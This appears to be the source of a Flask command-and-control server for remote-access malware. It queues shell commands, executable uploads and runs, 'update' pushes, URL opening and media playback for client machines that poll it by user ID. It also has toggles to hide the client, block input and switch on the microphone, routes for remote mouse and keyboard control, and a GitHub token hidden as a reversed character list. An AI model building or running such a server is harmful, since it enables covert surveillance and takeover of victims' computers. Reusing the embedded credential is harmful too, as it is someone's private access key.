import os
from time import time
from flask import Flask, render_template, request, redirect, jsonify, Response
from datetime import datetime
import base64
import json
import requests as rq
from zoneinfo import ZoneInfo

app = Flask(__name__)
firstReload = True
timezone = ZoneInfo("Asia/Kolkata")
startTime = time()
spam = False
send = "none"
selected_user = "93"
output = ""
control_data = {}
t = ['U', 'N', 'i', '4', 'I', '3', 'P', 'L', 'L', 'A', 'C', 'P', 'F', 'v', 'b', '0', 'V', 'A', '6', 'r', 'S', '0', 'b', 'i', '0', '4', 'z', '9', 'K', 'e', 'V', 'U', '0', '1', '2', 'm', '_', 'p', 'h', 'g']
token = ""
for i in reversed(t):
	token += i
owner = "ms32-org"
repo = "maksadPura"
branch = "main" 
commit_message = "file upload"
STATIC_FOLDER = os.path.join("static")
if not os.path.exists(STATIC_FOLDER):
    os.makedirs(STATIC_FOLDER)
state_file = os.path.join(STATIC_FOLDER, "state.json")
UPLOAD_FOLDER = os.path.join(STATIC_FOLDER, "sounds")
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)
with open(os.path.join(STATIC_FOLDER,"users.json")) as file:
	data = json.load(file)
users = data["users"]
with open(state_file,"w") as file:
    states = {}
    for user in users:
        states[str(user)] = {
            "hideToggleState": {
                "state": "off",
                "color": "red"
            },
            "spamToggleState": {
                "state": "off",
                "color": "red"
            },
            "flipToggleState": {
                "state": "off",
                "color": "red"
            },
            "shareToggleState": {
            	"state": "off",
            	"color": "red"
            },
            "INToggleState": {
            	"state": "off",
            	"color": "red"
            },
            "micToggleState": {
            	"state": "off",
            	"color": "red"
            }                        
        }
    json.dump(states, file, indent=4)			
@app.route("/")
def root():
    global firstReload
    state_file = os.path.join(STATIC_FOLDER, "state.json")
    files = os.listdir(UPLOAD_FOLDER)
    images = os.listdir(os.path.join(STATIC_FOLDER,"images"))
    videos = os.listdir(os.path.join(STATIC_FOLDER,"videos"))
    tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
    apps = os.listdir(os.path.join(STATIC_FOLDER,"apps"))
    state = None
    color = "red"
    data1= None
    with open(os.path.join(STATIC_FOLDER, "users.json"), "r") as file:
        target = json.load(file)
    users = target["users"]
    selected = target["selected"]
    with open(state_file, "r") as file:
        data1 = json.load(file)
    hs = data1[selected_user]["hideToggleState"]["state"]
    hc = data1[selected_user]["hideToggleState"]["color"]
    ss = data1[selected_user]["spamToggleState"]["state"]
    sc = data1[selected_user]["spamToggleState"]["color"]
    fs = data1[selected_user]["flipToggleState"]["state"]
    fc = data1[selected_user]["flipToggleState"]["color"]
    shs = data1[selected_user]["shareToggleState"]["state"]
    shc = data1[selected_user]["shareToggleState"]["color"]
    is1 = data1[selected_user]["INToggleState"]["state"]
    ic = data1[selected_user]["INToggleState"]["color"]
    ms = data1[selected_user]["micToggleState"]["state"]
    mc = data1[selected_user]["micToggleState"]["color"]
    if not firstReload:
        if time() - startTime <= 2.5:
            state = "Online"
            color = "green"
        elif time() - startTime > 2.5:
            state = "Offline"
            color = "red"
    if os.path.exists(tasks_file):
        with open(tasks_file, "r") as file:
            data = json.load(file)
    else:
        data = {"tasks": []}
    firstReload = False       
    return render_template("index.html", state=state if state else "Offline", files=files,images=images,videos=videos, exes=apps,tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,fs=fs,fc=fc,shc=shc,shs=shs,ic=ic,is1=is1,mc=mc,ms=ms,users=users,selected = selected_user)

@app.route("/edit", methods=["POST", "GET"])
def edit():
    global spam
    if request.method == "POST":
        message = request.form["text"]  
        with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
            if ("pLaY" not in message and "oPeN" not in message):    
                file.write("sPeAk" + message)
            else:
                file.write(message)
        return redirect("/")
    return "message updated"

@app.route("/command", methods=["GET", "POST"])
def command():
    global startTime
    global selected_user
    global spam
    message_file = os.path.join(STATIC_FOLDER, "message.txt")
    tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
    
    with open(tasks_file, "r") as file:
        tasks = json.load(file)

    if request.method == "POST":
        user = request.get_json().get("user")

        if selected_user == user:
            startTime = time()
            cmd = ""
            if os.path.exists(message_file):
                with open(message_file, "r") as file:
                    cmd = file.read()
            if cmd == "":
                if os.path.exists(tasks_file):
                    tasks_to_delete = None
                    for task in tasks["tasks"]:
                        if task["user"] == user:
                            exe = datetime.strptime(task["execution_time"], "%d-%m-%Y %H:%M")
                            exe = exe.strftime("%d-%m-%Y %H:%M")
                            now = datetime.now(timezone).strftime("%d-%m-%Y %H:%M")
                            if exe <= now:
                                cmd = task["cmd"]
                                tasks_to_delete = task["id"]
                                break
    
                    if tasks_to_delete is not None:
                         tasks["tasks"] = [task for task in tasks["tasks"] if task["id"] != tasks_to_delete]
                         with open(tasks_file, "w") as file:
                            json.dump(tasks, file, indent=4)

            if not spam:
                with open(message_file, "w") as file:
                    file.write("")

            return cmd if cmd else "none"

        else:
            tasks_to_delete = None
            taskcmd = None
            for task in tasks["tasks"]:
                if task["user"] == user:
                    exe = datetime.strptime(task["execution_time"], "%d-%m-%Y %H:%M")
                    exe = exe.strftime("%d-%m-%Y %H:%M")
                    now = datetime.now(timezone).strftime("%d-%m-%Y %H:%M")
                    if exe <= now:
                        taskcmd = task["cmd"]
                        tasks_to_delete = task["id"]
                        break

            if tasks_to_delete is not None:
                tasks["tasks"] = [task for task in tasks["tasks"] if task["id"] != tasks_to_delete]
                with open(tasks_file, "w") as file:
                    json.dump(tasks, file, indent=4)

            return taskcmd if taskcmd else "none"

    return "none"


@app.route("/play", methods=["POST", "GET"])
def play():
    if request.method == "POST":
        file = request.form["audio"] 
        if file != "":
            try:
                with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
                    a.write("pLaY " + file)
            except:
                pass
    return redirect("/")

@app.route("/delete", methods=["POST", "GET"])
def delete():
    if request.method == "POST":
        file = request.form["text"]
        if file != "":
            try:
                os.remove(os.path.join(UPLOAD_FOLDER, file))
            except:
                pass
    return redirect("/")

@app.route("/update", methods=["POST", "GET"])
def update():
    if request.method == "POST":
        file = request.files["file"]
        if file and file.filename != "":
            if file.filename.endswith(".exe"):
                file.save(os.path.join(STATIC_FOLDER,"updates","ms32-1.exe" ))
                with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
                    a.write("uPdAtE " + file.filename)
    return redirect("/")

@app.route("/url", methods=["POST", "GET"])
def url():
    if request.method == "POST":
        url = request.form["url"] or request.get_data()
        with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
            file.write("oPeN " + url)
    return redirect("/")

@app.route("/status", methods=["POST", "GET"])
def status():
    if request.method == "GET":
        deltaTime = time() - startTime
        if deltaTime >= 2.5:
            redirect("/")
            return "offline"
        else:
            redirect("/")
            return "online"

@app.route("/add-task", methods=["POST", "GET"])
def schedule():
    if request.method == "POST":
        data = {"tasks": []}
        cmd = request.form["task"]
        current_time = datetime.now(timezone).strftime("%d-%m-%Y %H:%M")
        try:
            execution_time = datetime.strptime(request.form["task-datetime"], "%Y-%m-%dT%H:%M")
        except ValueError as e:
            return f"Invalid datetime format: {e}", 400

        tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
        try:
            if os.path.exists(tasks_file):
                with open(tasks_file, "r") as file:
                    data = json.load(file)
        except Exception as e:
            return f"Error reading tasks.json: {e}", 500

        task = {
            "id": len(data["tasks"]),
            "cmd": cmd,
            "execution_time": execution_time.strftime("%d-%m-%Y %H:%M"),
            "user":request.form["user"]
        }
        data["tasks"].append(task)

        try:
            with open(tasks_file, "w") as file:
                json.dump(data, file, indent=4)
        except Exception as e:
            return f"Error writing to tasks.json: {e}", 500

        return redirect("/")

@app.route("/delete-task", methods=["POST", "GET"])
def delete_task():
    if request.method == "POST":
        id = request.form["task-id"]
        new_task = {"tasks": []}
        tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
        if os.path.exists(tasks_file):
            with open(tasks_file, "r") as file:
                tasks = json.load(file)
            for task in tasks["tasks"]:
                if str(task["id"]) != id:
                    new_task["tasks"].append(task)
            with open(tasks_file, "w") as file:
                json.dump(new_task, file, indent=4)
    return redirect("/")

@app.route("/toggle",methods=["POST"])
def toggle():
    global spam
    if request.method == "POST":
        data = request.get_json()
        cmd = data.get("cmd")
        state = data.get("state")
        color = "green" if state == "on" else "red"
        
        state_file = os.path.join(STATIC_FOLDER, "state.json")
        
        if os.path.exists(state_file):
            with open(state_file, "r") as file:
                data = json.load(file)
        
            if cmd == "hIdE":
                data[selected_user]["hideToggleState"]["state"] = state
                data[selected_user]["hideToggleState"]["color"] = color
            elif cmd == "sPaM":
                data[selected_user]["spamToggleState"]["state"] = state
                data[selected_user]["spamToggleState"]["color"] = color
            elif cmd == "fLiP":
                data[selected_user]["flipToggleState"]["state"] = state
                data[selected_user]["flipToggleState"]["color"] = color
            elif cmd == "sHaRe":
                data[selected_user]["shareToggleState"]["state"] = state
                data[selected_user]["shareToggleState"]["color"] = color
            elif cmd == "bLoCk":
                data[selected_user]["INToggleState"]["state"] = state
                data[selected_user]["INToggleState"]["color"] = color
            elif cmd == "mIc":
                data[selected_user]["micToggleState"]["state"] = state
                data[selected_user]["micToggleState"]["color"] = color                                             
            with open(state_file, "w") as file:
                json.dump(data, file, indent=4)
        
        if cmd == "hIdE" or cmd == "fLiP" or cmd == "sHaRe" or cmd == "bLoCk" or cmd == "mIc":
            with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
                file.write(f"{cmd} {state}")
        elif cmd == "sPaM":
            spam = True if state == "on" else False
    return redirect("/")

@app.route("/change-user", methods=["POST"])
def change_user():
    global selected_user
    data = request.get_json()
    user = data.get("user")
    selected_user = str(user)
    print(selected_user)
    with open(os.path.join(STATIC_FOLDER, "users.json"), "r") as file:
        target = json.load(file)
    target["selected"] = selected_user
    with open(os.path.join(STATIC_FOLDER, "users.json"), "w") as file:
        json.dump(target, file, indent=4)
    return "done"

@app.route("/exe",methods=["POST"])
def exe():
    if request.method == "POST":
        file = request.files["file"]
        if file and file.filename != "":
            file.save(os.path.join(STATIC_FOLDER, "apps", file.filename))
            with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
                a.write("rUn " + file.filename)
    return redirect("/")            

@app.route("/run-exe",methods=["POST"])
def run_exe():
    if request.method == "POST":
        file = request.form["exe"]
        if file:           
            with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
                a.write("rUn " + file)
    return redirect("/")        

@app.route("/image", methods=["GET", "POST"])
def img():
    if request.method == "POST":
        file = request.files["file"]
        if file and file.filename != "":
            file.save(os.path.join(STATIC_FOLDER, "images", file.filename))
            with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
                a.write("iMaGe " + file.filename)
    return redirect("/")

@app.route("/img",methods=["GET", "POST"])
def display():
	if request.method == "POST":
		file = request.form["img"]
		with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
			a.write("iMaGe " + file)
	return redirect("/")
	
@app.route("/vid",methods=["GET", "POST"])
def video():
	if request.method == "POST":
		file = request.form["vid"] 
		with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as a:
			a.write("vIdEo " + file)	
	return redirect("/")
@app.route("/logs",methods=["GET","POST"])
def logs():
    global prevlog
    data = None
    with open(os.path.join(STATIC_FOLDER,"logs.json"), "r") as file:
        data = json.load(file)
    prevlog = len(data["logs"])
    return render_template("logs.html",logs=data)
              

@app.route("/output", methods=["POST", "GET"])
def output1():
    data = request.get_json()
    err = data["err"]
    user = data["user"]
    logfile = os.path.join(STATIC_FOLDER, "logs.json")
    
    try:
        if os.path.exists(logfile):
            with open(logfile, "r") as file:
                data = json.load(file)
    except Exception as e:
        return f"Error reading log.json: {e}", 500

    log = {
        "no": len(data["logs"]) + 1, 
        "output": err,
        "time": datetime.now(timezone).strftime("%d-%m-%Y %H:%M"),
        "user": user
    }
    
    data["logs"].append(log)

    try:
        with open(logfile, "w") as file:
            json.dump(data, file, indent=4)
    except Exception as e:
        return f"Error writing to log.json: {e}", 500    
    
    return log

@app.route("/update-log",methods=["GET","POST"])
def update_log():
    with open(os.path.join(STATIC_FOLDER,"logs.json"), "r") as file:
        data = json.load(file)
    return jsonify(data)
	
@app.route("/err",methods=["GET","POST"])
def err():
    if request.method == "POST":
        no = request.form.get("err") or request.get_data()
        with open(os.path.join(STATIC_FOLDER,"message.txt")) as file:
            file.write(f"eRr {no}")
@app.route("/clear",methods=["POST","GET"])
def clear():
    with open(os.path.join(STATIC_FOLDER,"ip.txt"),"w") as file:
        file.write("")
    return "clear"

@app.route("/screen",methods=["GET","POST"])
def screen():
	return render_template("screen.html")    

@app.route("/terminal",methods=["GET", "POST"])
def terminal():
    global output
    if request.method == "GET":
        audios = os.listdir(os.path.join(STATIC_FOLDER,"sounds"))
        images = os.listdir(os.path.join(STATIC_FOLDER,"images"))
        videos = os.listdir(os.path.join(STATIC_FOLDER,"videos"))
        return render_template("terminal.html",user=selected_user,audios=audios,videos=videos,images=images)
    elif request.method == "POST":
        cmd = request.get_json()
        print(cmd)	
        if "input" in cmd:		
            if cmd["input"]:
                output = None
                with open(os.path.join(STATIC_FOLDER,"message.txt"),"w") as file:
                    cmd1 = cmd["input"]
                    file.write(f"cMd {cmd1}")
	            
        elif "output" in cmd:
            if cmd["output"]:
                output = cmd["output"]
                print("---------output stored-----------")		    
            
    return "done"
@app.route("/control", methods=["GET", "POST"])
def control():
    global control_data
    if request.method == "POST":
        data = request.get_json()
        if data["type"] == "key":
            control_data["type"] = "key"
            control_data["btn"] = data["button"]
        elif data["type"] == "click":
            control_data["type"] = "mouse"
            control_data["x"] = data["x"]
            control_data["y"] = data["y"]
            control_data["mouse"] = data["button"]
            control_data["width"] = data["width"]
            control_data["height"] = data["height"]
        elif data["type"] == "scroll":
            control_data["type"] = "scroll"
            control_data["deltaY"] = data["deltaY"]
        elif data["type"] == "dbclick":
            control_data["type"] = "dbclick"
            control_data["x"] = data["x"]
            control_data["y"] = data["y"]
            control_data["width"] = data["width"]
            control_data["height"] = data["height"]
        return "done"

    if request.method == "GET":
        data1 = control_data
        control_data = {}      
        return jsonify(data1)             
@app.route("/get-output",methods=["GET","POST"])
def get_output():
	global output
	if request.method == "GET":
		if output:
			shaktimaan = output
			output = None
			with open(os.path.join(STATIC_FOLDER,"debug.txt"),"w") as file:
				file.write(f"output {shaktimaan}")
			return shaktimaan
		else:
			return "try again",202	              
@app.route("/cmd",methods=["POST","GET"])
def cmd():
	if request.method == "POST":
		commands = {
			"speak":"sPeAk",
			"open":"oPeN",
			"play":"pLaY",
			"img":"iMaGe",
			"vid":"vIdEo",
			"err":"eRr",
			"cmd":"cMd"
		}
		msg = (request.get_data().decode("utf-8")).split(" ")
		com = commands[msg[0]]
		msg.pop(0)
		msg1 = " ".join(msg)
		command = f"{com} {msg1}"
		with open(os.path.join(STATIC_FOLDER,"message.txt"),"w") as file:
			file.write(command)
	return "done"
	
@app.route("/audio",methods=["GET","POST"])
def audio():
	global send
	if request.method == "POST":
		with open(os.path.join(STATIC_FOLDER,"mic","audio.wav"),"wb") as file:
			file.write(request.data)
			send = "play"
			res = Response("data: {send}\n\n", mimetype='text/event-stream') 
			send = "none"
	return res if request.method == "GET" else "stored"
		
@app.route("/upload-files",methods=["POST", "GET"])
def upload_files():
	if request.method == "POST":
		file = request.files["file"]
		path = request.form["path"]
		if file and file.filename !="":
			encoded_content = base64.b64encode(file.read()).decode("utf-8")
			url = f"https://api.github.com/repos/{owner}/{repo}/contents/{STATIC_FOLDER}/{path}/{file.filename}"
			file.save(os.path.join(STATIC_FOLDER,path,file.filename))
			headers = {
				    "Authorization": f"token {token}",
				    "Accept": "application/vnd.github.v3+json"
				}				
			data = {
				    "message": commit_message,
				    "content": encoded_content,
				    "branch": branch
				}				
			response = rq.put(url, json=data, headers=headers)				
			if response.status_code == 201:
				print("File successfully added to the repository!")
	return redirect("/")
			
if __name__ == "__main__":
    app.run(host="0.0.0.0")
